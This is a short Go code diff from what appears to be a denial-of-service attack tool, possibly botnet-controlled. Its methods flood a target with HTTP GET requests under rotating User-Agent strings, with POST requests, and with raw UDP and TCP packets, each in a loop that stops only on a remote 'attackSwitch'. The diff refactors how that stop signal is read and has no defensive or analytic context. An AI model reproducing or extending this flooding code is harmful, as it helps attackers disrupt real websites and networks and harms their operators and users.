@@ -99,13 +99,13 @@ func (a *Attack) getRequest() {
 		for agent := range httpAgent {
 			usrAgent.Header.Set("User-Agent", httpAgent[agent])
 			get.Do(usrAgent)
-			if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+			if callSwitch, keySwitch := SetupCaller(); keySwitch {
 				if callSwitch.CallAttack.attackSwitch {
 					break
 				}
 			}
 		}
-		if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+		if callSwitch, keySwitch := SetupCaller(); keySwitch {
 			if callSwitch.CallAttack.attackSwitch {
 				break
 			}
@@ -117,7 +117,7 @@ func (a *Attack) postRequest() {
 	post, postBody := a.setupHTTP()
 	for {
 		post.Do(postBody)
-		if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+		if callSwitch, keySwitch := SetupCaller(); keySwitch {
 			if callSwitch.CallAttack.attackSwitch {
 				break
 			}
@@ -151,7 +151,7 @@ func (a *Attack) udpPacket() {
 				IP: dst.IP,
 			},
 		)
-		if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+		if callSwitch, keySwitch := SetupCaller(); keySwitch {
 			if callSwitch.CallAttack.attackSwitch {
 				break
 			}
@@ -185,7 +185,7 @@ func (a *Attack) tcpPacket() {
 				IP: dst.IP,
 			},
 		)
-		if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+		if callSwitch, keySwitch := SetupCaller(); keySwitch {
 			if callSwitch.CallAttack.attackSwitch {
 				break
 			}
